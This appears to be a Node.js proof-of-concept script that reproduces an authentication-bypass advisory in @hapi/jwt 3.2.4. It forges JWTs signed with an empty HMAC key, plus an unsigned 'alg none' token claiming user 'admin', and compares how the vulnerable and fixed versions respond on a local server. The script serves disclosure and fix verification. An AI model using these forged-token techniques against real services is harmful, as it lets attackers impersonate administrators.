'use strict';

// Reproduces the two issues of GHSA-c26c-q3fh-3xf7 against a local hapi server.
// Usage: node poc/run.js vulnerable   (@hapi/jwt 3.2.4)
//        node poc/run.js fixed        (@hapi/jwt 3.2.5)
// Tokens are generated locally with node:crypto. Nothing leaves 127.0.0.1.

const Crypto = require('node:crypto');
const Hapi = require('@hapi/hapi');

const version = process.argv[2];
if (version !== 'vulnerable' && version !== 'fixed') {
    console.error('Usage: node poc/run.js <vulnerable|fixed>');
    process.exit(2);
}

const Jwt = require(version === 'vulnerable' ? '@hapi/jwt-vulnerable' : '@hapi/jwt-fixed');

const REAL_SECRET = 'real-shared-secret';

const b64url = (value) => Buffer.from(value).toString('base64url');

// Builds a signed JWT. key === null produces an unsigned token (alg none).
function makeToken(header, payload, key) {
    const data = `${b64url(JSON.stringify(header))}.${b64url(JSON.stringify(payload))}`;
    if (key === null) {
        return `${data}.`;
    }
    const signature = Crypto.createHmac('sha256', key).update(data).digest('base64url');
    return `${data}.${signature}`;
}

async function buildServer(keys) {
    const server = Hapi.server();
    await server.register(Jwt);
    server.auth.strategy('jwt', 'jwt', {
        keys,
        verify: { aud: false, iss: false, sub: false },
        validate: false
    });
    server.auth.default('jwt');
    server.route({
        method: 'GET',
        path: '/',
        handler: (request) => request.auth.credentials.user
    });
    return server;
}

const cases = [
    {
        id: 'H1-empty-hmac-key',
        description: 'Keys function returns an empty HMAC key; token signed with it (HS256)',
        keys: () => Buffer.alloc(0),
        token: makeToken({ alg: 'HS256', typ: 'JWT', kid: 'unknown' }, { user: 'admin' }, Buffer.alloc(0)),
        expectedFixed: 401
    },
    {
        id: 'H1-empty-key-object-hs256',
        description: 'Keys object with empty key pinned to HS256; token signed with the empty key',
        keys: () => ({ key: '', algorithms: ['HS256'] }),
        token: makeToken({ alg: 'HS256', typ: 'JWT', kid: 'unknown' }, { user: 'admin' }, ''),
        expectedFixed: 401
    },
    {
        id: 'H2-empty-string-in-array',
        description: 'Keys function returns an array with an empty string; unsigned token with an unknown kid',
        keys: () => [REAL_SECRET, ''],
        token: makeToken({ alg: 'none', typ: 'JWT', kid: 'unknown' }, { user: 'admin' }, null),
        expectedFixed: 401
    }
];

const legit = {
    id: 'control-legitimate',
    description: 'Token signed with the real secret; must be accepted in both versions',
    keys: () => [REAL_SECRET, ''],
    token: makeToken({ alg: 'HS256', typ: 'JWT', kid: 'tenant-a' }, { user: 'steve' }, REAL_SECRET),
    expected: 200
};

async function main() {
    const rows = [];
    let ok = true;

    for (const item of cases) {
        const server = await buildServer(item.keys);
        const res = await server.inject({ method: 'GET', url: '/', headers: { authorization: `Bearer ${item.token}` } });
        const expected = version === 'vulnerable' ? 200 : item.expectedFixed;
        if (res.statusCode !== expected) {
            ok = false;
        }
        rows.push({ case: item.id, status: res.statusCode, expected, description: item.description });
    }

    const server = await buildServer(legit.keys);
    const res = await server.inject({ method: 'GET', url: '/', headers: { authorization: `Bearer ${legit.token}` } });
    if (res.statusCode !== legit.expected) {
        ok = false;
    }
    rows.push({ case: legit.id, status: res.statusCode, expected: legit.expected, description: legit.description });

    console.log(`@hapi/jwt ${version === 'vulnerable' ? '3.2.4' : '3.2.5'}`);
    console.table(rows.map(({ case: c, status, expected, description }) => ({ case: c, status, expected, description })));
    console.log(ok ? 'RESULT: all cases match the expected behaviour.' : 'RESULT: mismatch, see table.');
    process.exit(ok ? 0 : 1);
}

main().catch((err) => {
    console.error(err);
    process.exit(1);
});
